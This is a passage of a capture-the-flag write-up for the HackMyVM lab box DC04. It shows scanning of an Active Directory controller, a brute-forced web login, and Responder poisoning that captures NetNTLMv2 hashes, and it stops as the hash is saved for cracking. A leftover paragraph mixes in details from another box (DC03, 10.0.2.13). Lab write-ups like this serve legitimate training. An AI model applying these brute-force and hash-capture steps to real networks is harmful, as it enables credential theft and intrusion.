---
title: Write-up DC04 on HackMyVM
author: eMVee
date: 2026-09-25 00:00:00 +0800
categories: [CTF, HackMyVM]
tags: [HackMyVM, OSCP, PNPT, Windows, DC04, AD, Active Directory, ZAP, OWASP ZAP, OWASP ZAP FUZZ, responder, john, jtr, rar2john, impacket-lookupsid, golden-ticket, evil-winrm]
render_with_liquid: false
---

Every pentester knows the feeling: you just wrapped up a box, the dopamine is still tracing through your veins, and you instantly want that next hit. Having just cleared System, I wasn't looking for a casual stroll or an easy win. I wanted to scale the walls of something heavier. Enter DC04, a machine specifically engineered to test your Active Directory enumeration and initial access strategy.

Let’s skip the theoretical talk, pull up a terminal, and map out this enterprise environment from scratch.

## Getting started
Our playground for this session is DC04, a vulnerable machine built for hands on Active Directory practice. The deployment follows the usual routine, importing the appliance straight into VirtualBox.

Before launching any network attacks, let's keep our terminal clean and structured by setting up a dedicated working directory.

```bash
┌──(emvee㉿kali)-[~/Documents]
└─$ mkdir DC04       

┌──(emvee㉿kali)-[~/Documents]
└─$ cd DC04     
                                                      
```

## Enumeration
Before throwing exploits, let’s verify our own position on the board. A quick peek at the eth0 interface maps out our network boundaries.
```bash                                                 
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ ip a       
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:24:46:73 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.3/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 435sec preferred_lft 435sec
    inet6 fe80::a00:27ff:fe24:4673/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```
We are sitting on the `10.0.2.0/24` subnet. Time to drop a quick ping sweep with `fping` to see who else is awake in this lab environment. This should be our target.
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ fping -ag 10.0.2.0/24 2> /dev/null  
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.28
```
Subtracting the local Kali machine, the standard gateway, and the hypervisor tech, we isolate our primary target at `10.0.2.28`. Let's lock it into an environment variable to save our fingers from typos later.
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ ip=10.0.2.28

```
By filtering out our local IP, the gateway, and the basic lab infrastructure, we are left with our target at 10.0.2.13. To speed up our terminal workflow and avoid typos down the road, we will store this target IP inside a local environment variable.
```bash
┌──(emvee㉿kali)-[~/Documents/DC03]
└─$ ip=10.0.2.13
```
Time to turn up the heat. Since this is a safe lab environment, we can drop a full port Nmap scan to see exactly what services this machine is hiding in the shadows.
``` bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ sudo nmap -sC -sV -T4 -p- $ip 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-25 10:12 +0200
Nmap scan report for 10.0.2.28
Host is up (0.0013s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://soupedecode.local
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-25 18:14:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49722/tcp open  msrpc         Microsoft Windows RPC
49768/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:FF:A6:47 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-25T18:15:25
|_  start_date: N/A
|_clock-skew: 10h00m01s
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:ff:a6:47 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.00 seconds
``` 
The scan took just over 3 minutes and mapped out a classic Windows Domain Controller. The footprint handed us the base architectural data we need:
- Domain Name: `SOUPEDECODE.LOCAL`
- Hostname: `DC01`

Several ports and services stood out immediately:
- Port 80 (HTTP): Running Apache 2.4.58 and PHP 8.2.12.
- Port 88 (Kerberos): Active and running Microsoft Windows Kerberos, which will be essential for potential ticket-based attacks later.
- Ports 389 & 3268 (LDAP / Global Catalog): Exposed the internal domain structure and confirmed the layout (Default-First-Site-Name).
- Port 445 (SMB): Message signing is enabled and strictly required (SMBv3.1.1), which eliminates basic SMB relay attacks.
- Port 5985 (WinRM): HTTP-based Windows Remote Management is open. This is a primary target for a remote shell if we manage to compromise valid credentials.
- Port 9389 (ADWS): Active Directory Web Services is exposed, confirming this is a modern Windows environment.

Running Apache and PHP is highly unusual and a massive red flag. Windows Domain Controllers normally use Microsoft IIS for web services. Seeing a Linux-native stack like Apache and PHP on a core Windows server screams "custom web application"—and where there is custom PHP code on a DC, there is a very high chance of finding web vulnerabilities like Local File Inclusion (LFI) or Remote Code Execution (RCE).

Before throwing active exploits or brute force tools at the Domain Controller, we need to check if the front door is accidentally left unlocked. In Windows environments, misconfigurations sometimes allow `Null Sessions` (authenticating with a completely blank username and password) or `Anonymous Access`. If enabled, these can leak user lists, password policies, or network shares without any credentials.

To verify this, we run `enum4linux` and `NetExec` (tool `nxc`).
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ enum4linux $ip
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Sep 25 10:18:37 2026

 =========================================( Target Information )=========================================
                                                                                                                                                                                                                                            
Target ........... 10.0.2.28                                                                                                                                                                                                                
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on 10.0.2.28 )=============================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+] Got domain/workgroup name: SOUPEDECODE                                                                                                                                                                                                  
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 =================================( Nbtstat Information for 10.0.2.28 )=================================
                                                                                                                                                                                                                                            
Looking up status of 10.0.2.28                                                                                                                                                                                                              
        DC01            <00> -         B <ACTIVE>  Workstation Service
        SOUPEDECODE     <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        SOUPEDECODE     <1c> - <GROUP> B <ACTIVE>  Domain Controllers
        DC01            <20> -         B <ACTIVE>  File Server Service
        SOUPEDECODE     <1b> -         B <ACTIVE>  Domain Master Browser

        MAC Address = 08-00-27-FF-A6-47

 =====================================( Session Check on 10.0.2.28 )=====================================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests. 
``` 
Our `enum4linux` pass attempts a quick session check using an empty string `''` for both the username and password. The server immediately returns an error and aborts the remaining tests. This confirms that basic unauthenticated RPC enumeration is blocked.

To double check the SMB layer specifically, we fire up `NetExec` to see if we can map any network shares anonymously.
```bash
┌──(emvee㉿kali)-[~/Documents/DC03]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u '' -p '' --shares
SMB         10.0.2.13       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.0.2.13       445    DC01             [-] SOUPEDECODE.LOCAL\: STATUS_ACCESS_DENIED 
SMB         10.0.2.13       445    DC01             [-] Error enumerating shares: Error occurs while reading from remote(104)
```
The server safely returns STATUS_ACCESS_DENIED. This proves that null sessions and anonymous guest access are disabled, meaning we cannot read or list any network shares at this stage.

Even though we got access denied errors, executing these commands was far from a waste of time. The SMB negotiation leaked the exact operating system and build version of our target: `Windows Server 2022 Build 20348 x64`.

Knowing the exact build number changes our strategy completely. It helps us instantly rule out older, legendary exploits (like EternalBlue or BlueKeep) and gives us the precise blueprint we need if we have to look for version specific privilege escalation vectors later.



It still bothers me that an Apache server paired with PHP is up and running directly on a core Windows Domain Controller. That setup is not default on a Domain Controller. To understand what kind of custom exposure we are dealing with, it is time to pivot our attention to the web application layer and inspect the anomalies closely.

First, we throw `whatweb` at the target to analyze the raw HTTP response behavior.
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ whatweb http://$ip  
http://10.0.2.28 [302 Found] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12], IP[10.0.2.28], OpenSSL[3.1.3], PHP[8.2.12], RedirectLocation[http://soupedecode.local], X-Powered-By[PHP/8.2.12]
http://soupedecode.local [302 Found] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12], IP[10.0.2.28], OpenSSL[3.1.3], PHP[8.2.12], RedirectLocation[http://soupedecode.local], X-Powered-By[PHP/8.2.12]

```
The server immediately forces a `302 Found` redirection, explicitly pointing any bare IP traffic straight to the internal domain name: `http://soupedecode.local`. This behavior strongly implies that the web application expects virtual host routing. Before we can browse this app normally through a browser, we will have to map this domain to our local `/etc/hosts` file.

To uncover structural security flaws within this bizarre Windows-Apache hybrid ecosystem, we run a specialized web vulnerability scan using `nikto`/
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ nikto -h http://$ip                                
- Nikto v2.6.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.28
+ Target Hostname:    10.0.2.28
+ Target Port:        80
+ Platform:           Windows
+ Start Time:         2026-09-25 10:26:52 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
+ ERROR: Failed to check for updates: 403
+ [999986] /: Retrieved x-powered-by header: PHP/8.2.12.
+ No CGI Directories found (use '-C all' to force check all possible dirs). CGI tests skipped.
+ [013587] /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+ [013587] /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
+ [013587] /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy
+ [013587] /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
+ [013587] /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+ [600595] OpenSSL/3.1.3 appears to be outdated (current is at least 3.6.0). OpenSSL 1.1.1w is current for 1.x and is supported via contract, and 3.0.12 for 3.0.x, and 3.1.4 for 3.1.x.
+ [600625] PHP/8.2.12 appears to be outdated (current is at least 8.5.1).
+ [600050] Apache/2.4.58 appears to be outdated (current is at least 2.4.66).
+ [000434] /: HTTP TRACE method is active and replies which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ [001406] /server-status: The mod_status module reveals Apache information. See: https://httpd.apache.org/docs/2.4/mod/mod_status.html
+ [750500] /icons/: Directory indexing found.
+ [003584] /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ [007342] /: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors directive. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Frame-Options
+ [007352] /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ 8037 requests: 16 errors and 15 items reported on the remote host
+ End Time:           2026-09-25 10:33:42 (GMT2) (410 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```


The scan took almost 7 minutes and exposes an incredibly loose and poorly hardened web environment. The scan reveals several takeaways:
- Outdated Components: The entire platform runs on aging software. The `Apache 2.4.58` engine, `PHP 8.2.12` runtime, and `OpenSSL 3.1.3 library` are completely out of date. This opens up opportunities to look for known public CVEs targeting this specific Windows native compilation.
- Zero Defense in Depth Headers: The application strips away or completely lacks vital modern defense headers. It fails to implement HSTS (`Strict-Transport-Security`), which allows attackers to downgrade communication to unencrypted channels. It lacks an explicit `Referrer-Policy` and `Permissions-Policy`, resulting in structural data leaks. Crucially, the absence of `X-Content-Type-Options: nosniff` prevents the browser from blocking misaligned MIME types, exposing the site to potential cross-site scripting (XSS) or exploitation vectors via custom user file uploads.
- Information Leaks: The server leaves sensitive debug features exposed. The HTTP TRACE method is left active, laying a dangerous foundation for Cross-Site Tracing (XST) attacks. Even worse, the `/server-status` endpoint is publicly accessible, giving an unauthenticated attacker a direct window into server performance, internal routing paths, and live client requests.

Since the web architecture redirects directly to the domain name, I quickly added `soupedecode.local` to my `/etc/hosts` file. With proper routing in place, it was time to map out the hidden web directories. This time we use feroxbuster to see what files are exposed behind the scenes.

```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ feroxbuster --url 'http://soupedecode.local/'

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://soupedecode.local/
 🚩  In-Scope Url          │ soupedecode.local
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       30w      308c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       33w      305c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://soupedecode.local/ => http://soupedecode.local
503      GET       11l       44w      408c http://soupedecode.local/examples
301      GET        9l       30w      356c http://soupedecode.local/licenses => http://soupedecode.local:8080/licenses/
200      GET      358l      787w    21442c http://soupedecode.local/server-status
200      GET     1169l     7264w   102074c http://soupedecode.local/server-info
[####################] - 61s    30015/30015   0s      found:5       errors:0      
[####################] - 61s    30000/30000   493/s   http://soupedecode.local/    
```
The fuzzing run wraps up in just 61 seconds and drops two massive findings right into our face: `/server-status` and `/server-info`.
Both endpoints return a clean `200 OK` HTTP response code, meaning unauthenticated access is fully enabled. In a production environment, exposing these two native Apache modules on an internal asset is a significant finding. Exposing them on the primary Domain Controller is an absolute disaster
- `./server-status`: Gives us a live dashboard of every active request hitting the web server. If automated scripts or administrators are browsing this application, we can harvest their HTTP requests and internal parameters in real time
- `./server-info`: Leaks the complete configuration blueprint of the Apache instance. It exposes loaded modules, environment paths, server root configurations, and potential hardcoded developer settings.
- Additionally, the `/licenses` directory attempts to `redirect to port 8080`, pointing to a potential secondary web application listening on the server. 

![image](/assets/img/WriteUp/HackMyVM/DC04/1.png){: width="700" height="400" }

Hitting the `/server-info` endpoint dropped a massive wall of information that we now need to sift through. This isn't just a standard landing page; it is a giant dump of the server's configuration parameters, loaded extensions, and runtime environment.

Instead of reading through thousands of lines of configuration data line by line, we have to look for high value targets in the noise:
- Environment variables: Looking for hardcoded developer credentials or local path setups.
- Loaded modules: Checking if dangerous handlers or custom PHP modules are active.
- Virtual host layouts: Finding hidden subdomains or internal routing paths.

![image](/assets/img/WriteUp/HackMyVM/DC04/2.png){: width="700" height="400" }

Inside that massive wall of configuration data, a critical architecture leak popped out: a hidden virtual host routing to a subdomain named `heartbeat.soupedecode.local` running on the server.

This changes our attack path. A subdomain like `heartbeat` strongly indicates some form of custom monitoring service or health check API. In many infrastructure environments, these internal endpoints lack proper access controls or run outdated code to track system performance. 

Since it is hosted right on the Domain Controller, targeting this subdomain could be our shortcut to finding web exploits like Server Side Request Forgery (SSRF) or a direct administrative backdoor. 

Before we can interact with it, we need to head back to our local `/etc/hosts` file on Kali and append this newly discovered domain alongside the primary one.
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ sudo nano /etc/hosts             
[sudo] password for emvee: 

┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ cat /etc/hosts                                                               
127.0.0.1       localhost 
127.0.1.1       kali
10.0.2.28       DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL soupedecode.local heartbeat.soupedecode.local

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```
Navigating to the subdomain brings up a login page, meaning we are going to need valid credentials to go any deeper.

![image](/assets/img/WriteUp/HackMyVM/DC04/3.png){: width="700" height="400" }

## Initial access

Our first instinct when hitting a custom web panel? Test for lazy administrative setups. We attempt to brute force the low hanging fruit by throwing standard default credentials at the prompt, starting with the classic `admin:admin` combination. 

![image](/assets/img/WriteUp/HackMyVM/DC04/4.png){: width="700" height="400" }

Unfortunately, the application isn't that poorly configured. The server shoots back a login failure message, meaning the low hanging fruit path is closed and we have to dig a bit deeper to find our way in.

![image](/assets/img/WriteUp/HackMyVM/DC04/5.png){: width="700" height="400" }

Within OWASP ZAP we have to send the request to the OWASP ZAP Fuzz tool.

![image](/assets/img/WriteUp/HackMyVM/DC04/6.png){: width="700" height="400" }

Next step is to set the variable where our payload should be injected.

![image](/assets/img/WriteUp/HackMyVM/DC04/7.png){: width="700" height="400" }

We have to load the password list in the tool. We use this `/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt` password list.

![image](/assets/img/WriteUp/HackMyVM/DC04/8.png){: width="700" height="400" }

Now close the window after configuring the attack by pressing `OK`.

![image](/assets/img/WriteUp/HackMyVM/DC04/9.png){: width="700" height="400" }

Last step is to start the fuzzing. While testing the login portal, I hit a strange technical anomaly. When proxying the traffic through OWASP ZAP to inspect the request and response cycles, a failed login attempt returned absolutely no visible error message on the page. Yet, the exact same failed attempt performed manually inside Firefox clearly rendered a "Login Failed" warning on the UI. 

This behavior usually indicates that the web application relies on complex, front end JavaScript routing or session token validation that proxy spiders like ZAP can easily disrupt during automated parsing. 

To maintain pinpoint control over how the application handles our traffic, it is time to pivot our strategy. We need a tool that lets us fine tune our request structure without breaking the application's response state. It is time to firing up Burp Suite Intruder. There is a catch, though. Since I am operating on Burp Suite Community Edition, the tool intentionally throttles the attack speed, making our brute force run significantly slower than it would be inside OWASP ZAP. But in cybersecurity, accuracy always beats speed. If a tool works and correctly processes the application's responses without breaking the authentication logic, we just have to deal with the rate limiting and let it run.


![image](/assets/img/WriteUp/HackMyVM/DC04/10.png){: width="700" height="400" }

Send the request to Burp Suite Intruder so we can configure our attack.

![image](/assets/img/WriteUp/HackMyVM/DC04/11.png){: width="700" height="400" }

Next step is to configure the variable for the payload and the same passwordlist.

![image](/assets/img/WriteUp/HackMyVM/DC04/12.png){: width="700" height="400" }

In Burp Suite Intruder we can search for texts as well. In this case we want to look for: `Invalid username or password.`.
If this is not shown we have found valid credentials.

![image](/assets/img/WriteUp/HackMyVM/DC04/13.png){: width="700" height="400" }

We ace found credentials! We can now try to login as `admin` witht he password `nimda`.

![image](/assets/img/WriteUp/HackMyVM/DC04/15.png){: width="700" height="400" }

It looks like the webpage is expecting an IP address. This can be useful to get NTLMv2 hashes from a service account for example.

To capitalize on this, we fire up Responder on our active `eth0` interface to listen for these broadcast requests and actively poison them.
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ sudo responder -I eth0 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [10.0.2.3]
    Responder IPv6             [fe80::a00:27ff:fe24:4673]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-4TSDGWSAGCS]
    Responder Domain Name      [7RDZ.LOCAL]
    Responder DCE-RPC Port     [46280]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...                                                                                                                                                                                                                 

```

The heartbeat dashboard contains an input field designed to take an IP address or destination host.

We input our Kali attacker IP (`10.0.2.3`) into the web interface and hit submit. This forces the Domain Controller to reach out directly to our system over the network.Because Responder is listening in the background, it instantly intercepts the incoming connection, poisons the name resolution requests, and catches the cryptographic handshake.
```bash
[+] Listening for events...                                                                                                                                                                                                                 

[*] [LLMNR]  Poisoned answer sent to fe80::b986:db13:9ad5:821 for name DC01
[*] [MDNS] Poisoned answer sent to 10.0.2.28       for name DC01.local
[*] [LLMNR]  Poisoned answer sent to 10.0.2.28 for name DC01
[*] [MDNS] Poisoned answer sent to fe80::b986:db13:9ad5:821 for name DC01.local
[*] [MDNS] Poisoned answer sent to 10.0.2.28       for name DC01.local
[*] [LLMNR]  Poisoned answer sent to fe80::b986:db13:9ad5:821 for name DC01
[*] [LLMNR]  Poisoned answer sent to 10.0.2.28 for name DC01
[*] [MDNS] Poisoned answer sent to fe80::b986:db13:9ad5:821 for name DC01.local
[SMB] NTLMv2-SSP Client   : 10.0.2.28
[SMB] NTLMv2-SSP Username : soupedecode\websvc
[SMB] NTLMv2-SSP Hash     : websvc::soupedecode:6da21140dcdb415f:A771FCCD76FFCD8BA1FF3807BBCF9820:010100000000000000BCD7E3DE4CDD01FF2E06D63C1E87A300000000020008003700520044005A0001001E00570049004E002D003400540053004400470057005300410047004300530004003400570049004E002D00340054005300440047005700530041004700430053002E003700520044005A002E004C004F00430041004C00030014003700520044005A002E004C004F00430041004C00050014003700520044005A002E004C004F00430041004C000700080000BCD7E3DE4CDD010600040002000000080030003000000000000000000000000040000088EB3C2287D9297424FB9AB6B215CD064BD0178A8D7C95D5E1752F2E4758BF460A0010000000000000000000000000000000000009001A0063006900660073002F00310030002E0030002E0032002E0033000000000000000000                                                                                                                                                                                                                                      
[*] [NBT-NS] Poisoned answer sent to 10.0.2.28 for name SOUPEDECODE (service: File Server)
[*] [MDNS] Poisoned answer sent to 10.0.2.28       for name SOUPEDECODE.LOCAL
[*] [MDNS] Poisoned answer sent to fe80::b986:db13:9ad5:821 for name SOUPEDECODE.LOCAL
[*] [LLMNR]  Poisoned answer sent to fe80::b986:db13:9ad5:821 for name SOUPEDECODE
[*] [LLMNR]  Poisoned answer sent to 10.0.2.28 for name SOUPEDECODE
[*] [MDNS] Poisoned answer sent to 10.0.2.28       for name SOUPEDECODE.LOCAL
[*] [LLMNR]  Poisoned answer sent to fe80::b986:db13:9ad5:821 for name SOUPEDECODE
[*] [LLMNR]  Poisoned answer sent to 10.0.2.28 for name SOUPEDECODE
[*] [MDNS] Poisoned answer sent to fe80::b986:db13:9ad5:821 for name SOUPEDECODE.LOCAL
[SMB] NTLMv2-SSP Client   : fe80::b986:db13:9ad5:821
[SMB] NTLMv2-SSP Username : SOUPEDECODE\DC01$
[SMB] NTLMv2-SSP Hash     : DC01$::SOUPEDECODE:1b5f05599d6a5f5e:B9DDCCA9D973C5C703FAD2B5F3697E14:010100000000000000BCD7E3DE4CDD01A32EE39ABD73957E00000000020008003700520044005A0001001E00570049004E002D003400540053004400470057005300410047004300530004003400570049004E002D00340054005300440047005700530041004700430053002E003700520044005A002E004C004F00430041004C00030014003700520044005A002E004C004F00430041004C00050014003700520044005A002E004C004F00430041004C000700080000BCD7E3DE4CDD010600040002000000080030003000000000000000000000000040000088EB3C2287D9297424FB9AB6B215CD064BD0178A8D7C95D5E1752F2E4758BF460A0010000000000000000000000000000000000009002C0063006900660073002F0053004F005500500045004400450043004F00440045002E004C004F00430041004C000000000000000000                                                                                                                                                                                                   
[*] [MDNS] Poisoned answer sent to 10.0.2.28       for name SOUPEDECODE.LOCAL
[*] [MDNS] Poisoned answer sent to fe80::b986:db13:9ad5:821 for name SOUPEDECODE.LOCAL
[*] [MDNS] Poisoned answer sent to 10.0.2.28       for name SOUPEDECODE.LOCAL
[*] [MDNS] Poisoned answer sent to fe80::b986:db13:9ad5:821 for name SOUPEDECODE.LOCAL
[*] [LLMNR]  Poisoned answer sent to fe80::b986:db13:9ad5:821 for name SOUPEDECODE
[*] [LLMNR]  Poisoned answer sent to 10.0.2.28 for name SOUPEDECODE
[*] [LLMNR]  Poisoned answer sent to fe80::b986:db13:9ad5:821 for name SOUPEDECODE
[*] [LLMNR]  Poisoned answer sent to 10.0.2.28 for name SOUPEDECODE
[*] Skipping previously captured hash for SOUPEDECODE\DC01$
[*] [MDNS] Poisoned answer sent to 10.0.2.28       for name SOUPEDECODE.LOCAL
[*] [MDNS] Poisoned answer sent to fe80::b986:db13:9ad5:821 for name SOUPEDECODE.LOCAL
[*] [MDNS] Poisoned answer sent to 10.0.2.28       for name SOUPEDECODE.LOCAL
[*] [MDNS] Poisoned answer sent to fe80::b986:db13:9ad5:821 for name SOUPEDECODE.LOCAL
[*] [LLMNR]  Poisoned answer sent to fe80::b986:db13:9ad5:821 for name SOUPEDECODE
[*] [LLMNR]  Poisoned answer sent to 10.0.2.28 for name SOUPEDECODE
[*] [LLMNR]  Poisoned answer sent to fe80::b986:db13:9ad5:821 for name SOUPEDECODE
[*] [LLMNR]  Poisoned answer sent to 10.0.2.28 for name SOUPEDECODE
[*] Skipping previously captured hash for SOUPEDECODE\DC01$
[*] [MDNS] Poisoned answer sent to fe80::b986:db13:9ad5:821 for name SOUPEDECODE.LOCAL
[*] [MDNS] Poisoned answer sent to 10.0.2.28       for name SOUPEDECODE.LOCAL
[*] [LLMNR]  Poisoned answer sent to 10.0.2.28 for name SOUPEDECODE
[*] [MDNS] Poisoned answer sent to 10.0.2.28       for name SOUPEDECODE.LOCAL
[*] [LLMNR]  Poisoned answer sent to fe80::b986:db13:9ad5:821 for name SOUPEDECODE
[*] [MDNS] Poisoned answer sent to fe80::b986:db13:9ad5:821 for name SOUPEDECODE.LOCAL
[*] [LLMNR]  Poisoned answer sent to fe80::b986:db13:9ad5:821 for name SOUPEDECODE
[*] [LLMNR]  Poisoned answer sent to 10.0.2.28 for name SOUPEDECODE

```
The trap worked perfectly and dropped two massive captures into our console:
-  `soupedecode\websvc` (Service Account): This is a high-value user account hash. The custom web service running on Apache/PHP is executing commands under this identity. This hash can be cracked offline to recover the cleartext password.
- `SOUPEDECODE\DC01$` (Machine Account): The Domain Controller's computer account itself interacted with us. While machine hashes ($) aren't easily crackable using standard wordlists, catching this authentication event proves we have a solid execution path between the web interface and core system processes.

We now have the cryptographic `NetNTLMv2` hash for the `websvc` account. Our immediate next move is offline cracking to turn this string into a usable password.
With the `NetNTLMv2` hash safely isolated in our workspace, it is time to shift from network capturing to offline cracking. We save the string into a local file and feed it directly into John the Ripper.
```bash
┌──(emvee㉿kali)-[~/Documents/DC04]
└─$ nano hash   

